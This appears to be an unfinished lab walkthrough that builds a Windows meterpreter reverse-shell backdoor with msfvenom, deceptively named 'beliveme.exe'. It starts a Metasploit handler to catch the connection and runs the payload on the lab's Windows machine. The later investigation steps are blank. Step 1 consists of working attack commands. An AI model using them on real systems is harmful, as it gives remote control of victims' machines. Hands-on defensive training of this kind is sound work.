# WarmUp

Create a malware with msfvenom, execute it on the victim machine and investigate with built-in win tools
Let's start it.


### Step 1

First, open an Terminal window as Administrator (CTRL + Click)
![](attachments/warmup_01.png)

Click Yes at the User the User Account Control Prompt.

Open a Kali linux command prompt: 
![](attachments/warmup_02.png)

On the Kali console, check the IP address with:
`ifconfig`
![](attachments/warmup_03.png)

Mark the IP address of the Kali linux machine eth0 interface. Your IP will be DIFFERENT!

Run the following command to create a simple backdoor.
`sudo su -`
`msfvenom --platform Windows -a x86 -p windows/meterpreter/reverse_tcp lhost=<YOUR ETH0 IP> lport=4444 -f exe -o /tmp/beliveme.exe`
`ls -l beliveme.exe`
`cp ./beliveme.exe /mnt/c/temp`

Now, we need to start the handler on attacker (Linux) machine. We need one more shell to the Linux box. Select the down carrot from the upper tabs on the Winodws Terminal and select kali-linux
Become a root:
`sudo su -`

Start the metasploit handler:
$`msfconsole -q`

msf6 > `use exploit/multi/handler`
msf6 exploit(multi/handler) > `set PAYLOAD windows/meterpreter/reverse_tcp`
msf6 exploit(multi/handler) > `set LHOST <YOUR ETH0 IP>` Your IP will be DIFFERENT
msf6 exploit(multi/handler) > `exploit`

![](attachments/warmup_04.png)

Open a Windows command prompt, by selecting the down carrot from the the Windows Terminal.
Once it's opened, run these commands:
`cd \temp`
`beliveme.exe`

### step 2



### step 3

### step 4
